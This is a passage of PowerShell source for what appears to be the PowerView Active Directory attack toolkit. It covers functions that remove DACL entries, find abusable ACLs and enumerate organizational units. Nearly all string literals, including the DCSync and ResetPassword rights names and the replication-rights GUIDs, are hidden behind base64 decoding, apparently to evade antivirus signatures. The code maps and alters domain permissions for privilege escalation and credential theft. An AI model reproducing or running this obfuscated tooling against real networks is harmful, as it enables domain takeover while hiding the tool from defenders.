            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            $ControlType = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            $ACEs = @()
            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Find-InterestingDomainAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,
        [Switch]
        $ResolveGUIDs,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))] = $ResolveGUIDs }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))] = $RightsFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ObjectSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ADNameArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ResolvedSIDs = @{}
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        Get-DomainObjectAcl @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
                if ($_.SecurityIdentifier.Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]
                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                        }
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityReferenceDomain
                            $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $IdentityReferenceDN
                            $Object = Get-DomainObject @ObjectSearcherArguments
                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                                    $IdentityReferenceClass = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                                    $IdentityReferenceClass = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                                    $IdentityReferenceClass = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass
                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                                }
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}
function Get-DomainOU {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBPAFUAPQAuACoA')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}
function Get-DomainSite {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
